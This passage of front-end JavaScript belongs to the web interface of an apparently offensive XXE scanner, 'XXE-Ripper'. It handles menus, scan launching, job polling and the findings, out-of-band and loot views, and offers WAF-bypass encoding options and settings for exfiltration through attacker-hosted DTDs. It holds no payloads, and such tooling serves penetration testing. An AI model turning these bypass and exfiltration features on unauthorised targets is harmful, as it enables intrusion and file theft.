    const key = trig.dataset.menu;
    const cfg = MENUS[key];
    const dropdown = document.createElement("div");
    dropdown.className = "menu-dropdown";
    dropdown.innerHTML = cfg.items.map((it, idx) => {
      if (it.sep) return `<div class="menu-sep"></div>`;
      const disabled = it.disabled && it.disabled();
      const checked = it.check && it.check();
      const cls = [
        "menu-item-d",
        disabled ? "disabled" : "",
        it.check ? "has-check" : "",
        checked ? "checked" : "",
      ].filter(Boolean).join(" ");
      return `<div class="${cls}" data-mi="${idx}">
        <span class="mn-label">${esc(it.label)}</span>
        ${it.kbd ? `<span class="mn-kbd">${esc(it.kbd)}</span>` : ""}
      </div>`;
    }).join("");
    dropdown.addEventListener("click", e => {
      const item = e.target.closest("[data-mi]");
      if (!item) return;
      e.stopPropagation();
      const idx = parseInt(item.dataset.mi, 10);
      const it = cfg.items[idx];
      if (it.disabled && it.disabled()) return;
      if (it.check){
        handleCheckItem(it.id);
      } else {
        handleMenuItem(it.id);
      }
      closeAllMenus();
    });
    trig.appendChild(dropdown);
    trig.addEventListener("click", e => {
      e.stopPropagation();
      const wasOpen = trig.classList.contains("open");
      closeAllMenus();
      if (!wasOpen){
        trig.classList.add("open");
        openMenu = key;
      }
    });
    trig.addEventListener("mouseenter", () => {
      if (openMenu && openMenu !== key){
        closeAllMenus();
        trig.classList.add("open");
        openMenu = key;
      }
    });
  });
}

function closeAllMenus(){
  document.querySelectorAll(".menu-trigger.open")
    .forEach(t => t.classList.remove("open"));
  openMenu = null;
}

document.addEventListener("click", e => {
  if (!e.target.closest(".menu-trigger")) closeAllMenus();
});

function handleCheckItem(id){
  const map = {
    "opt-timing": "timing",
    "opt-svg": "svg",
    "opt-saml": "saml",
    "opt-full": "full_file_scan",
    "opt-unsafe": "unsafe",
    "opt-debug": "debug",
    "view-density": "density",
  };
  const k = map[id];
  if (!k) return;

  if (id === "view-density"){
    toggleDensity();
    return;
  }

  state.defaults[k] = !state.defaults[k];
  localStorage.setItem("xxe.defaults", JSON.stringify(state.defaults));
  const el = $(k);
  if (el && el.type === "checkbox") el.checked = state.defaults[k];
  toast(`Default "${k}" ${state.defaults[k] ? "enabled" : "disabled"}`,
        "ok");
}

function handleMenuItem(id){
  switch(id){
    case "new":            openDrawer(); break;
    case "rerun":          rerunSelected(); break;
    case "stop":           stopSelected(); break;
    case "export-json":
      if (state.selectedJobId) exportJob(state.selectedJobId, "json");
      break;
    case "export-sarif":
      if (state.selectedJobId) exportJob(state.selectedJobId, "sarif");
      break;
    case "export-html":
      if (state.selectedJobId)
        window.open(`/api/jobs/${state.selectedJobId}/report.html.download`,
                    "_blank");
      break;
    case "view-html":
      if (state.selectedJobId)
        window.open(`/api/jobs/${state.selectedJobId}/report.html`,
                    "_blank");
      break;
    case "close-detail":   closeDetail(); break;

    case "view-focus-filter":
      $("tbFilter").focus();
      break;
    case "view-clear-filter":
      state.filter = "";
      $("tbFilter").value = "";
      renderCenter();
      break;
    case "view-show-all":
      state.activeSevs = new Set(
        ["CRITICAL","HIGH","MEDIUM","LOW","INFO"]);
      syncSevButtons();
      renderFindings();
      toast("Showing all severities", "ok");
      break;
    case "view-crit-only":
      state.activeSevs = new Set(["CRITICAL"]);
      syncSevButtons();
      renderFindings();
      break;
    case "view-crit-high":
      state.activeSevs = new Set(["CRITICAL","HIGH"]);
      syncSevButtons();
      renderFindings();
      break;
    case "view-hide-info":
      state.activeSevs.delete("INFO");
      syncSevButtons();
      renderFindings();
      break;

    case "help-shortcuts":
      $("shortcutsBackdrop").classList.add("open");
      break;
    case "help-about":
      $("aboutBackdrop").classList.add("open");
      break;
  }
}

function syncSevButtons(){
  document.querySelectorAll("#sevToggles .sev-btn").forEach(btn => {
    const sev = btn.dataset.sev;
    btn.classList.toggle("on", state.activeSevs.has(sev));
  });
}

buildMenus();

$("shortcutsClose").addEventListener("click", () => {
  $("shortcutsBackdrop").classList.remove("open");
});
$("aboutClose").addEventListener("click", () => {
  $("aboutBackdrop").classList.remove("open");
});
$("shortcutsBackdrop").addEventListener("click", e => {
  if (e.target === $("shortcutsBackdrop")) {
    $("shortcutsBackdrop").classList.remove("open");
  }
});
$("aboutBackdrop").addEventListener("click", e => {
  if (e.target === $("aboutBackdrop")) {
    $("aboutBackdrop").classList.remove("open");
  }
});

// =================================================================
// Command palette
// =================================================================
let cmdkIndex = 0;
let cmdkResults = [];

function openCmdk(){
  $("cmdkBackdrop").classList.add("open");
  const inp = $("cmdkInput");
  inp.value = ""; inp.focus();
  updateCmdk("");
}
function closeCmdk(){ $("cmdkBackdrop").classList.remove("open"); }

function updateCmdk(q){
  q = q.toLowerCase().trim();
  const items = [];

  const cmds = [
    { id:"new", label:"New scan", desc:"Open scan drawer",
      icon:'M12 5v14M5 12h14' },
    { id:"rerun", label:"Re-run selected", desc:"Restart the current scan",
      icon:'M23 4v6h-6M1 20v-6h6',
      disabled: () => !state.selectedJobId },
    { id:"stop", label:"Stop selected", desc:"Cancel running scan",
      icon:'M6 6h12v12H6z',
      disabled: () => {
        if (!state.selectedJobId) return true;
        const job = state.jobs.find(j => j.id === state.selectedJobId);
        return !job || job.status !== "running";
      } },
    { id:"export-html",  label:"Download HTML report",
      desc:"Download selected job as HTML",
      icon:'M7 10l5 5 5-5M12 15V3',
      disabled: () => !state.selectedJobId },
    { id:"view-html",    label:"View HTML report",
      desc:"Open the report in a new tab",
      icon:'M15 3h6v6M10 14 21 3M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6',
      disabled: () => !state.selectedJobId },
    { id:"clear-filter", label:"Clear filter",  desc:"Reset finding filter",
      icon:'M18 6L6 18M6 6l12 12' },
    { id:"close-detail", label:"Close detail",  desc:"Deselect target",
      icon:'M18 6L6 18M6 6l12 12',
      disabled: () => !state.selectedJobId },
    { id:"density", label:"Toggle density",     desc:"Compact / comfortable",
      icon:'M4 6h16M4 12h16M4 18h16' },
    { id:"shortcuts", label:"Keyboard shortcuts", desc:"View all shortcuts",
      icon:'M9 3H5a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2h-4' },
    { id:"about",   label:"About XXE-Ripper",   desc:"v1.0",
      icon:'M12 16v-4M12 8h.01' },
  ];
  for (const c of cmds){
    if (!q || c.label.toLowerCase().includes(q) || c.id.includes(q)){
      items.push({ kind:"cmd", id:c.id, label:c.label, desc:c.desc,
                   icon:c.icon, disabled:c.disabled });
    }
  }

  for (const j of state.jobs){
    if (!q) break;
    const hay = (j.url + " " + j.id).toLowerCase();
    if (hay.includes(q)){
      items.push({
        kind:"job", id:j.id, label:j.url || "(pending)",
        desc:j.status, icon:'M4 6h16v12H4z'
      });
    }
  }

  if (q && state.findings.length){
    for (const f of state.findings){
      const hay = (f.id + " " + (f.title||"")).toLowerCase();
      if (hay.includes(q)){
        items.push({
          kind:"finding", id:f.id, label:f.id,
          desc:f.title || "", sev:f.severity,
        });
        if (items.length > 40) break;
      }
    }
  }

  cmdkResults = items;
  cmdkIndex = 0;
  renderCmdk();
}

function renderCmdk(){
  const el = $("cmdkList");
  if (!cmdkResults.length){
    el.innerHTML = `<div class="cmdk-empty">No matches</div>`;
    return;
  }
  el.innerHTML = cmdkResults.map((r, i) => {
    const disabled = r.disabled && r.disabled();
    const active = i === cmdkIndex ? " active" : "";
    const dis = disabled ? " disabled" : "";
    let icon = "";
    if (r.icon){
      icon = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
        stroke-width="2" stroke-linecap="round"><path d="${r.icon}"/></svg>`;
    } else if (r.kind === "finding"){
      icon = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
        stroke-width="2"><circle cx="12" cy="12" r="4"/></svg>`;
    } else {
      icon = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
        stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2"/></svg>`;
    }
    let sevPill = "";
    if (r.kind === "finding" && r.sev){
      const s = r.sev;
      const c = s === "CRITICAL" ? "crit"
              : s === "HIGH" ? "high"
              : s === "MEDIUM" ? "med" : "fg-3";
      const bg = s === "CRITICAL" ? "crit-bg"
               : s === "HIGH" ? "high-bg"
               : s === "MEDIUM" ? "med-bg" : "surface-3";
      sevPill = `<span class="pill-sm" style="color:var(--${c});background:var(--${bg})">${esc(s)}</span>`;
    }
    return `<div class="cmdk-item${active}${dis}" data-i="${i}">
      ${icon}
      <span class="label">${esc(r.label)}</span>
      ${sevPill}
      <span class="desc">${esc(r.desc || "")}</span>
    </div>`;
  }).join("");
  const active = el.querySelector(".cmdk-item.active");
  if (active) active.scrollIntoView({block:"nearest"});
}

function runCmdkResult(i){
  const r = cmdkResults[i];
  if (!r) return;
  if (r.disabled && r.disabled()) return;
  closeCmdk();
  if (r.kind === "cmd"){
    handleMenuItem(r.id);
  } else if (r.kind === "job"){
    selectJob(r.id);
  } else if (r.kind === "finding"){
    selectFinding(r.id);
  }
}

$("cmdkInput").addEventListener("input", e => updateCmdk(e.target.value));
$("cmdkInput").addEventListener("keydown", e => {
  if (e.key === "ArrowDown"){
    e.preventDefault();
    cmdkIndex = Math.min(cmdkResults.length - 1, cmdkIndex + 1);
    renderCmdk();
  } else if (e.key === "ArrowUp"){
    e.preventDefault();
    cmdkIndex = Math.max(0, cmdkIndex - 1);
    renderCmdk();
  } else if (e.key === "Enter"){
    e.preventDefault();
    runCmdkResult(cmdkIndex);
  } else if (e.key === "Escape"){
    closeCmdk();
  }
});
$("cmdkBackdrop").addEventListener("click", e => {
  if (e.target === $("cmdkBackdrop")) closeCmdk();
});

// =================================================================
// Drawer
// =================================================================
function openDrawer(){
  const mapping = [
    ["timing","timing"], ["svg","svg"], ["saml","saml"],
    ["full_file_scan","full_file_scan"], ["unsafe","unsafe"],
    ["debug","debug"],
  ];
  for (const [key, elId] of mapping){
    const el = $(elId);
    if (el && state.defaults[key] !== undefined){
      el.checked = state.defaults[key];
    }
  }
  $("drawerBackdrop").classList.add("open");
  setTimeout(() => $("url").focus(), 80);
}
function closeDrawer(){
   $("drawerBackdrop").classList.remove("open");
   $("bypass_waf").checked = false;
   $("bypass_waf_include_custom").checked = false;
   $("wafPanel").style.display = "none";
   $("oob_auto").checked = false;
   $("oobTimeoutGroup").style.display = "none";
   $("oob").disabled = false;
   $("oob_dtd_dir").value = "";
   $("oob_dtd_url_prefix").value = "";
   if ($("oob_dtd_use_webui")) $("oob_dtd_use_webui").checked = false;
   if ($("oob_dtd_webui_url")) $("oob_dtd_webui_url").value = "";
   if ($("oobDtdWebuiGroup"))
     $("oobDtdWebuiGroup").style.display = "none";
 }
$("drawerClose").addEventListener("click", closeDrawer);
$("drawerCancel").addEventListener("click", closeDrawer);
$("drawerBackdrop").addEventListener("click", e => {
  if (e.target === $("drawerBackdrop")) closeDrawer();
});

$("oob_auto").addEventListener("change", () => {
  $("oobTimeoutGroup").style.display =
    $("oob_auto").checked ? "" : "none";
  $("oob").disabled = $("oob_auto").checked;
});

$("bypass_waf").addEventListener("change", () => {
  $("wafPanel").style.display =
    $("bypass_waf").checked ? "" : "none";
});

const _oobDtdWebuiCb = $("oob_dtd_use_webui");
if (_oobDtdWebuiCb){
  _oobDtdWebuiCb.addEventListener("change", () => {
    $("oobDtdWebuiGroup").style.display =
      _oobDtdWebuiCb.checked ? "" : "none";
  });
}

const WAF_ENCODERS = [
  {id:"utf16be",           label:"UTF-16 BE (BOM)"},
  {id:"utf16le",           label:"UTF-16 LE (BOM)"},
  {id:"utf16decl",         label:"UTF-16 (decl)"},
  {id:"utf16nobom",        label:"UTF-16 BE (no BOM)"},
  {id:"utf32be",           label:"UTF-32 BE"},
  {id:"utf32le",           label:"UTF-32 LE"},
  {id:"ebcdic",            label:"EBCDIC CP037"},
  {id:"ucs4_2143",         label:"UCS-4 2143"},
  {id:"utf8bom",           label:"UTF-8 BOM"},
  {id:"public",            label:"PUBLIC vs SYSTEM"},
  {id:"public_charref",    label:"PUBLIC + char-ref SYSTEM"},
  {id:"b64_uri",           label:"base64 data: URI"},
  {id:"whitespace_pad",    label:"Whitespace padding"},
  {id:"doctype_closure",   label:"DOCTYPE closure confusion"},
  {id:"pe_stager",         label:"Parameter-entity stager"},
];

$("encoderGrid").innerHTML = WAF_ENCODERS.map(e => `
  <label class="f-check">
    <input type="checkbox" class="waf-enc" value="${e.id}" checked>
    <span>${esc(e.label)}</span>
  </label>`).join("");

$("wafToggleAll").addEventListener("click", () => {
  const boxes = document.querySelectorAll(".waf-enc");
  const allOn = Array.from(boxes).every(b => b.checked);
  boxes.forEach(b => b.checked = !allOn);
});

// =================================================================
// Start scan
// =================================================================
async function startScan(){
  const urlText = ($("url").value || "").trim();
  const urlList = urlText.split(/\s*\n\s*/).map(s => s.trim())
                  .filter(Boolean);
  const burpRaw = ($("burpRequest").value || "").trim();

  if (!urlList.length && !burpRaw){
    toast("Target URL required", "err");
    return;
  }

  // Pre-auth requests — split on a fresh HTTP request line so a user
  // can paste multiple requests separated by blank lines and each one
  // stays intact. The split keeps the request line in the following
  // chunk (lookahead, no capture).
  const preAuthRaw = ($("preAuthRequests").value || "").trim();
  let preAuthBodies = [];
  if (preAuthRaw){
    const chunks = preAuthRaw.split(
      /\n(?=(?:GET|POST|PUT|PATCH|DELETE|HEAD|OPTIONS)\s+\S+\s+HTTP\/)/
    );
    preAuthBodies = chunks.map(s => s.trim()).filter(Boolean);
  }

  const inlinePayloads = $("payloads").value.split("\n")
    .map(s => s.trim()).filter(Boolean);

  let cookieContent = "";
  if ($("cookieFile").files && $("cookieFile").files.length > 0){
    try { cookieContent = await readFileAsText($("cookieFile").files[0]); }
    catch(e){ toast("Cookie file read failed: " + e, "err"); return; }
  }

  const autoOob = $("oob_auto").checked;
  const baseCfg = {
    oob_auto: autoOob,
    oob_domain: autoOob ? "" : ($("oob").value || "").trim(),
    ...(autoOob ? { oob_timeout: parseFloat($("oob_timeout").value) || 8 } : {}),
    proxy: ($("proxy").value || "").trim(),
    cookie: ($("cookie").value || "").trim(),
    cookie_content: cookieContent,
    rate: parseFloat($("rate").value) || 0,
    budget: parseFloat($("budget").value) || 600,
    timeout_connect: parseFloat($("timeout_connect").value) || 5,
    timeout_read: parseFloat($("timeout_read").value) || 15,
    threads: parseInt($("threads").value) || 4,
    payloads: inlinePayloads,
    pre_auth_requests_raw: preAuthBodies.map(b => ({ body: b })),
    timing: $("timing").checked,
    svg: $("svg").checked,
    saml: $("saml").checked,
    ...( $("bypass_waf").checked ? {
      bypass_waf_encoders: Array.from(
        document.querySelectorAll(".waf-enc:checked")).map(el => el.value),
      bypass_waf_include_custom: $("bypass_waf_include_custom").checked,
    } : {} ),
    full_file_scan: $("full_file_scan").checked,
    no_fingerprint: $("no_fingerprint").checked,
    unsafe: $("unsafe").checked,
    verify_tls: $("verify_tls").checked,
    debug: $("debug").checked,
    oob_dtd_dir: ($("oob_dtd_dir").value || "").trim(),
    oob_dtd_url_prefix: ($("oob_dtd_url_prefix").value || "").trim(),
    oob_dtd_use_webui: $("oob_dtd_use_webui")?.checked || false,
    oob_dtd_webui_url: ($("oob_dtd_webui_url")?.value || "").trim(),
  };

  const jobs = [];
  if (burpRaw){
    jobs.push({ ...baseCfg, url:"", burp_request_raw: burpRaw });
  } else {
    for (const u of urlList) jobs.push({ ...baseCfg, url: u });
  }

  const btn = $("drawerLaunch");
  btn.disabled = true;
  const newIds = [];
  try {
    for (const cfg of jobs){
      try {
        const r = await fetch("/api/scan", {
          method:"POST",
          headers:{"Content-Type":"application/json"},
          cache: "no-store",
          body: JSON.stringify(cfg),
        });
        const j = await r.json();
        if (j.job_id) newIds.push(j.job_id);
      } catch(e){ toast("Failed to start: " + e, "err"); }
    }
    if (newIds.length){
      toast(`Started ${newIds.length} scan${newIds.length>1?"s":""}`, "ok");
      closeDrawer();
      await refreshJobs();
      if (newIds[0]) selectJob(newIds[0]);
    }
  } finally {
    btn.disabled = false;
  }
}
$("drawerLaunch").addEventListener("click", startScan);

// =================================================================
// Job listing
// =================================================================
let _lastSelectedJobStatus = null;

async function refreshJobs(){
  try {
    const r = await fetch("/api/jobs", { cache: "no-store" });
    if (!r.ok){ setConn(false); return; }
    const jobs = await r.json();
    state.jobs = jobs;
    renderTargets();
    updateStatusTotals();
    renderContextBar();
    renderToolbarState();
    setConn(true, jobs.some(j => j.status === "running"));

    // If the selected job's status just changed, force an immediate
    // snapshot fetch and restart the poll timer if it stopped.
    const sel = jobs.find(j => j.id === state.selectedJobId);
    const newStatus = sel ? sel.status : null;
    if (newStatus !== _lastSelectedJobStatus){
      _lastSelectedJobStatus = newStatus;
      if (state.selectedJobId && sel){
        pollCurrentJob();
        if (newStatus === "running" && !pollTimer){
          pollTimer = setInterval(pollCurrentJob, 1000);
        }
      }
    }
  } catch(e){ setConn(false); }
}

function setConn(online, busy){
  const dot = $("connDot");
  const txt = $("connText");
  dot.className = "dot" + (online ? (busy ? " busy" : "") : " offline");
  txt.textContent = online ? (busy ? "scanning" : "connected") : "offline";
}

let pollTimer = null;
let cursor = 0;
let elapsedTimer = null;
let jobStartTime = null;

function selectJob(id){
  state.selectedJobId = id;
  state.selectedFindingId = null;
  cursor = 0;
  state.findings = [];
  state.events = [];
  state.oob = [];
  state.logs = [];
  _lastSelectedJobStatus = null;

  renderTargets();
  renderCenter();
  renderInspector();
  renderContextBar();
  renderToolbarState();

  if (pollTimer) clearInterval(pollTimer);
  pollTimer = setInterval(pollCurrentJob, 1000);
  pollCurrentJob();

  const job = state.jobs.find(j => j.id === id);
  jobStartTime = job?.started_at || null;
  if (elapsedTimer) clearInterval(elapsedTimer);
  elapsedTimer = setInterval(updateElapsed, 500);
}

function closeDetail(){
  state.selectedJobId = null;
  state.selectedFindingId = null;
  state.findings = [];
  state.events = [];
  state.oob = [];
  state.logs = [];
  _lastSelectedJobStatus = null;
  if (pollTimer){ clearInterval(pollTimer); pollTimer = null; }
  if (elapsedTimer){ clearInterval(elapsedTimer); elapsedTimer = null; }
  $("sbPhase").style.display = "none";
  $("sbElapsed").style.display = "none";
  renderTargets();
  renderCenter();
  renderInspector();
  renderContextBar();
  renderToolbarState();
}

function updateElapsed(){
  if (!jobStartTime){ $("sbElapsed").style.display = "none"; return; }
  const job = state.jobs.find(j => j.id === state.selectedJobId);
  if (!job || job.status !== "running"){
    $("sbElapsed").style.display = "none";
    return;
  }
  const s = Math.floor(Date.now()/1000 - jobStartTime);
  $("sbElapsed").style.display = "flex";
  $("sbElapsedN").textContent = s;
}

async function pollCurrentJob(){
  if (!state.selectedJobId) return;
  try {
    const r = await fetch(
      `/api/jobs/${state.selectedJobId}?since=${cursor}`,
      { cache: "no-store" }
    );
    if (!r.ok) return;
    const snap = await r.json();
    cursor = snap.next_cursor;

    for (const ev of (snap.events || [])){
      if (ev.kind === "log"){
        state.logs.push(ev);
      } else if (ev.kind === "oob_dispatch" || ev.kind === "oob_result"){
        // Skip — the authoritative, already-reconciled OOB list is
        // snap.oob_dispatches below. Backend updates correlated
        // in-place when an oob_result event fires.
        continue;
      } else {
        state.events.push(ev);
      }
    }
    // Backend's reconciled list: correlated flag is already flipped
    // to true/false for callbacks that landed. Using it directly
    // keeps the OOB tab in sync with the findings.
    state.oob = snap.oob_dispatches || [];
    state.loot = snap.loot || [];
    state.findings = snap.findings || [];

    renderTargets();
    renderCenter();
    updateStatusTotals();
    updateStatusBar(snap);
    renderContextBar();
    renderToolbarState();

    if (!state.selectedFindingId && state.findings.length){
      state.selectedFindingId = state.findings[0].id;
      renderCenter();
      renderInspector();
    }

    if (snap.status !== "running"){
      if (pollTimer){ clearInterval(pollTimer); pollTimer = null; }
      if (elapsedTimer){ clearInterval(elapsedTimer); elapsedTimer = null; }
      $("sbPhase").style.display = "none";
      $("sbElapsed").style.display = "none";
      refreshJobs();
    }
  } catch(e){}
}

// =================================================================
// Render: targets
// =================================================================
function renderTargets(){
  const el = $("targetsBody");
  $("targetsCount").textContent = state.jobs.length || "";

  if (!state.jobs.length){
    el.innerHTML = `
      <div class="empty">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
             stroke-width="1.5">
          <rect x="3" y="3" width="18" height="18" rx="2"/>
          <path d="M3 9h18M9 21V9"/>
        </svg>
        <strong>No targets</strong>
        <span>Start a scan to see results here</span>
        <span class="hint">⌘K → New scan</span>
      </div>`;
    return;
  }

  el.innerHTML = state.jobs.map(j => {
    const sel = state.selectedJobId === j.id ? " selected" : "";
    const crit = j.n_critical || 0;
    const high = j.n_high || 0;
    const tot = j.n_findings || 0;
    return `
      <div class="target${sel}" data-id="${esc(j.id)}">
        <div class="target-row1">
          <span class="target-dot ${esc(j.status)}"></span>
          <span class="target-url" title="${esc(j.url)}">
            ${esc(j.url || "(pending)")}
          </span>
        </div>
        <div class="target-row2">
          <span>${esc(j.status)}</span>
          ${tot ? `<span class="stat"><span class="num">${tot}</span> findings</span>` : ""}
          ${crit ? `<span class="stat crit">${crit} crit</span>` : ""}
          ${!crit && high ? `<span class="stat high">${high} high</span>` : ""}
          ${j.started_at ? `<span>${relTime(j.started_at)}</span>` : ""}
        </div>
      </div>`;
  }).join("");

  el.querySelectorAll(".target").forEach(t => {
    t.addEventListener("click", () => selectJob(t.dataset.id));
  });
}

// =================================================================
// Render: context bar
// =================================================================
function renderContextBar(){
  const bar = $("contextBar");
  const job = state.jobs.find(j => j.id === state.selectedJobId);
  if (!job){
    bar.style.display = "none";
    return;
  }
  bar.style.display = "flex";
  $("ctxUrl").textContent = job.url || "(pending)";
  $("ctxUrl").title = job.url || "";

  const dot = $("ctxDot");
  dot.className = "ctx-dot " + (job.status || "queued");
  const pill = $("ctxPill");
  pill.textContent = job.status;
  pill.className = "ctx-pill " + (job.status || "queued");
}

function renderToolbarState(){
  const job = state.jobs.find(j => j.id === state.selectedJobId);
  const hasJob = !!job;
  $("tbStop").disabled     = !hasJob || job.status !== "running";
  $("tbRerun").disabled    = !hasJob;
  $("tbJson").disabled     = !hasJob;
  $("tbSarif").disabled    = !hasJob;
  $("tbHtml").disabled     = !hasJob;
  $("tbViewHtml").disabled = !hasJob;
}

// =================================================================
// Center pane tabs
// =================================================================
document.querySelectorAll(".ptab").forEach(t => {
  t.addEventListener("click", () => {
    state.centerTab = t.dataset.tab;
    document.querySelectorAll(".ptab").forEach(x =>
      x.classList.toggle("active", x.dataset.tab === state.centerTab));
    renderCenter();
  });
});

function renderCenter(){
  const el = $("centerBody");

  $("cntFindings").textContent = state.findings.length;
  $("cntEvents").textContent   = state.events.filter(
    e => e.kind !== "finding" && e.kind !== "finding_updated").length;
  $("cntOob").textContent      = state.oob.length;
  $("cntLoot").textContent     = state.loot.length;

  if (!state.selectedJobId){
    el.innerHTML = `
      <div class="empty">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
             stroke-width="1.5">
          <circle cx="11" cy="11" r="7"/>
          <line x1="21" y1="21" x2="16.65" y2="16.65"/>
        </svg>
        <strong>Select a target</strong>
        <span>Findings will appear here as the scan runs</span>
      </div>`;
    return;
  }

  if (state.centerTab === "findings") return renderFindings();
  if (state.centerTab === "events")   return renderEvents();
  if (state.centerTab === "oob")      return renderOob();
  if (state.centerTab === "loot")     return renderLoot();
  if (state.centerTab === "log")      return renderLog();
}

function sevRank(s){
  return {CRITICAL:5, HIGH:4, MEDIUM:3, LOW:2, INFO:1}[s] || 0;
}

function getFilteredFindings(){
  let list = state.findings.slice();
  list = list.filter(f => state.activeSevs.has(f.severity || "INFO"));
  if (state.filter){
    const q = state.filter.toLowerCase();
    list = list.filter(f => {
      const hay = [f.id, f.title, f.description,
                   (f.cwe||[]).join(" "),
                   (f.reasons||[]).join(" ")]
        .join(" ").toLowerCase();
      return hay.includes(q);
    });
  }
  const { key, dir } = state.sort;
  list.sort((a, b) => {
    let av, bv;
    if (key === "severity"){ av = sevRank(a.severity); bv = sevRank(b.severity); }
    else if (key === "confidence"){ av = a.confidence||0; bv = b.confidence||0; }
    else if (key === "id"){ av = a.id||""; bv = b.id||""; }
    else { av = a.title||""; bv = b.title||""; }
    if (av < bv) return dir === "asc" ? -1 : 1;
    if (av > bv) return dir === "asc" ? 1 : -1;
    return 0;
  });
  return list;
}

function renderFindings(){
  const el = $("centerBody");
  const job = state.jobs.find(j => j.id === state.selectedJobId);

  if (job && job.status === "running" && !state.findings.length){
    el.innerHTML = `
      <table class="findings">
        <thead><tr>
          <th style="width:88px">Severity</th>
          <th style="width:240px">Finding</th>
          <th>Title</th>
          <th style="width:60px">Conf</th>
        </tr></thead>
        <tbody>
          ${Array.from({length:8}).map(() => `
            <tr class="skel-row">
              <td><div class="bar"></div></td>
              <td><div class="bar"></div></td>
              <td><div class="bar"></div></td>
              <td><div class="bar"></div></td>
            </tr>`).join("")}
        </tbody>
      </table>`;
    return;
  }

  const filtered = getFilteredFindings();
  if (!filtered.length){
    el.innerHTML = `
      <div class="empty">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
             stroke-width="1.5">
          <circle cx="11" cy="11" r="7"/>
          <line x1="21" y1="21" x2="16.65" y2="16.65"/>
        </svg>
        <strong>${state.findings.length ? "No matches" : "No findings"}</strong>
        <span>${state.findings.length
          ? "Adjust filters or search query"
          : "Findings will appear here as the scan runs"}</span>
      </div>`;
    return;
  }

  const arrow = k => state.sort.key === k
    ? `<span class="arrow">${state.sort.dir === "asc" ? "▲" : "▼"}</span>` : "";
  const cls = k => "sortable" + (state.sort.key === k ? " sorted" : "");

  el.innerHTML = `
    <table class="findings">
      <thead><tr>
        <th class="${cls("severity")}" data-sort="severity" style="width:88px">
          Severity${arrow("severity")}</th>
        <th class="${cls("id")}" data-sort="id" style="width:250px">
          Finding${arrow("id")}</th>
        <th class="${cls("title")}" data-sort="title">
          Title${arrow("title")}</th>
        <th class="${cls("confidence")}" data-sort="confidence"
            style="width:56px;text-align:right">
          Conf${arrow("confidence")}</th>
      </tr></thead>
      <tbody>
        ${filtered.map(f => {
          const sev = esc(f.severity || "INFO");
          const sel = state.selectedFindingId === f.id ? " selected" : "";
          const cwe = (f.cwe && f.cwe.length) ? f.cwe[0] : "";
          return `
            <tr class="sev-row-${sev}${sel}" data-fid="${esc(f.id)}">
              <td><span class="sev-label ${sev}">${sev}</span></td>
              <td class="fid" title="${esc(f.id)}">
                ${esc(f.id)}
                ${cwe ? `<span class="fid-cwe">${esc(cwe)}</span>` : ""}
              </td>
              <td class="ftitle" title="${esc(f.title||"")}">
                ${esc(f.title || "")}
              </td>
              <td class="fconf">${f.confidence || 0}</td>
            </tr>`;
        }).join("")}
      </tbody>
    </table>`;

  el.querySelectorAll("th.sortable").forEach(th => {
    th.addEventListener("click", () => {
      const k = th.dataset.sort;
      if (state.sort.key === k){
        state.sort.dir = state.sort.dir === "asc" ? "desc" : "asc";
      } else {
        state.sort.key = k;
        state.sort.dir = (k === "severity" || k === "confidence")
          ? "desc" : "asc";
      }
      renderFindings();
    });
  });
  el.querySelectorAll("tr[data-fid]").forEach(tr => {
    tr.addEventListener("click", () => selectFinding(tr.dataset.fid));
  });
}

function renderEvents(){
  const el = $("centerBody");
  const filtered = state.events.filter(
    e => e.kind !== "finding" && e.kind !== "finding_updated");
  if (!filtered.length){
    el.innerHTML = `
      <div class="empty">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
             stroke-width="1.5">
          <path d="M12 2v20M2 12h20"/>
        </svg>
        <strong>No events yet</strong>
        <span>Phase transitions and other scan events will appear here</span>
      </div>`;
    return;
  }
  el.innerHTML = filtered.map(ev => {
    const time = fmtTime(ev.ts);
    const tag = esc(ev.kind);
    let body = "";
    const d = ev.data || {};
    if (ev.kind === "phase_start")   body = `starting phase ${esc(d.name||"")}`;
    else if (ev.kind === "phase_end")
      body = `${esc(d.name||"")} finished in ${d.elapsed||0}s`;
    else if (ev.kind === "phase_error")
      body = `${esc(d.name||"")}: ${esc(d.error||"error")}`;
    else if (ev.kind === "phase_skipped")
      body = `${esc(d.name||"")}: skipped (${esc(d.reason||"")})`;
    else if (ev.kind === "status")
      body = `status → ${esc(d.status)}`;
    else if (ev.kind === "target_start")
      body = "target scan started";
    else if (ev.kind === "target_end")
      body = "target scan finished" + (d.had_findings ? " with findings" : "");
    else body = JSON.stringify(d).slice(0, 200);
    return `
      <div style="display:flex;gap:12px;padding:8px 14px;
        border-bottom:1px solid var(--line);font-size:11.5px">
        <span style="color:var(--fg-4);font-family:var(--mono);
          flex-shrink:0;min-width:68px;font-variant-numeric:tabular-nums">
          ${time}
        </span>
        <span class="sev-label INFO">${tag}</span>
        <span style="color:var(--fg-2);flex:1">${esc(body)}</span>
      </div>`;
  }).join("");
}

function renderOob(){
  const el = $("centerBody");
  if (!state.oob.length){
    el.innerHTML = `
      <div class="empty">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
             stroke-width="1.5">
          <circle cx="12" cy="12" r="9"/>
          <path d="M12 3a15 15 0 0 1 0 18M3 12h18"/>
        </svg>
        <strong>No OOB dispatches</strong>
        <span>Set an OOB domain or enable Auto OOB mode to enable
          blind XXE probes</span>
      </div>`;
    return;
  }
  el.innerHTML = state.oob.map(d => {
    const corr = d.correlated;
    let mark, cls;
    if (corr === true){ mark = "✓"; cls = "ok"; }
    else if (corr === false){ mark = "·"; cls = "INFO"; }
    else { mark = "?"; cls = "MEDIUM"; }
    const sub = d.subdomain || "";
    const hasExfil = !!(d.exfil_preview || d.loot_id);
    const exfilBlock = hasExfil ? `
      <div style="display:flex;gap:10px;padding:10px 14px 12px 126px;
        border-bottom:1px solid var(--line);
        background:rgba(74,222,128,.04);font-size:11px;
        align-items:flex-start">
        <span style="color:var(--ok);font-family:var(--mono);
          font-size:9.5px;font-weight:600;letter-spacing:.06em;
